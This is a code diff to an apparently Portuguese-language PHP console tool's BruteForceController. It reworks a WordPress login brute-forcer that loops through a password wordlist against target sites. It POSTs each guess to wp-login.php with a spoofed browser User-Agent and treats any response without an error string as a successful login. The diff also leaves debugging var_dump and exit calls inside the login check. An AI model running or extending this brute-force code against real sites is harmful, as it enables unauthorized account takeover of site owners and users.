@@ -12,8 +12,12 @@ use Symfony\Component\Console\Helper\Table;
 //use Symfony\Component\Finder\Finder;
 use Symfony\Component\Console\Helper\ProgressBar;
 use Respect\Validation\Validator as v;
-use Guzzle\Http\Client;
+use GuzzleHttp\Client;
+use GuzzleHttp\Cookie\CookieJar;
+use GuzzleHttp\Cookie\CookieJarInterface;
+use GuzzleHttp\Message\Response;
 use Aszone\WordPress\WordPress;
+
 
 class BruteForceController extends Command{
 
@@ -81,6 +85,10 @@ class BruteForceController extends Command{
     	
     }
 
+    /**
+     * @param InputInterface $input
+     * @param OutputInterface $output
+     */
     protected function executeBruteForceWordPress(InputInterface $input, OutputInterface $output){
 
         //$wordlistClass = new Wordlist();
@@ -111,13 +119,22 @@ class BruteForceController extends Command{
 
             foreach ($arrTarget as $keyTarget => $valueTarget) { 
                 $output->writeln(""); 
-                $output->writeln("<info>Alvo ".$keyTarget." - ".$valueTarget."</info>"); 
+                $output->writeln("<info>Alvo ".$keyTarget." - ".$valueTarget."</info>");
+
+                $wp = new WordPress();
+
+                $isWordPress=$wp->isWordPress($valueTarget);
+                $baseUrlWordPress=$wp->getBaseUrlWordPressByUrl($valueTarget);
+
+
                 foreach ($arrWordlist as $keyWordList => $valueWordList) {
                     
                     $progress->advance();
-                    $returnHtml=$this->sendDataToLoginWordPress($username,$valueWordList,$valueTarget);
+                    $returnHtml=$this->sendDataToLoginWordPress($username,$valueWordList,$baseUrlWordPress);
+
                     $validateLogon=$this->validateLogon($returnHtml);
-                    if($validateLogon){
+
+                    if($validateLogon and $isWordPress){
 
                         $resultFinal[$keyTarget]['target']=$valueTarget;
                         $resultFinal[$keyTarget]['username']=$username;
@@ -152,12 +169,52 @@ class BruteForceController extends Command{
 
     protected function sendDataToLoginWordPress($username,$password,$target){
 
-        $wp = new WordPress();
 
-        $isWordPress=$wp->isWordPress($target);
-        var_dump($isWordPress);
-        echo "***";
-        exit();
+
+            $client 	= new Client(['base_url' => $target]);
+            $jar = new CookieJar();
+            $options = [
+                'config' => [
+                    'curl' => [
+                        //'CURLOPT_URL'=>$target . 'wp-login.php',
+                        'CURLOPT_RETURNTRANSFER'=> 1,
+                        'CURLOPT_REFERER' => $target . 'wp-login.php',
+                        'CURLOPT_COOKIEFILE' => 'cookie.txt',
+                        'CURLOPT_COOKIEJAR'=>'cookie.txt',
+                        'CURLOPT_POST' => 1,
+
+                    ],
+                ],
+                'body' => [
+                    'log' => $username,
+                    'pwd' => $password,
+                    'wp-submit' => 'Log In',
+                    'redirect_to' => $target.'wp-admin/&testcookie=1',
+                ],
+                'headers' => [
+                    'User-Agent' => 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.6) Gecko/20070725 Firefox/2.0.0.6',
+                ],
+                //'cookies' => $jar,
+                'debug' => true,
+
+
+            ];
+            $resultSend = $client->post( $target.'wp-login.php', $options);
+                /*->setPostField('log',$username )
+                ->setPostField('pwd',$password )
+                ->setPostField('wp-submit','Log In' )
+                ->setPostField('redirect_to',$target.'wp-admin/&testcookie=1' );*/
+            //$response = $resultSend->send();
+            //echo $resultSend->getBody();
+            //var_dump($resultSend->getHeaders());
+            //var_dump($resultSend->getEffectiveUrl());
+
+            //exit();
+
+            return $resultSend->getBody()->getContents();
+
+        //return false;
+        /*exit();
 
         $cookie="cookie.txt";
 
@@ -176,12 +233,17 @@ class BruteForceController extends Command{
         curl_close($ch);
         //var_dump($result);
         return $result;
+        */
     }
 
     protected function validateLogon($html){
         
         //preg_match("/<strong>(.+?)<\/strong>/", $html, $resultMatches, PREG_OFFSET_CAPTURE, 3);
+
         $pos = strpos($html, "<strong>ERRO</strong>");
+        var_dump($html);
+        var_dump($pos);
+        exit();
         if($pos !== false){
            return false;
         }
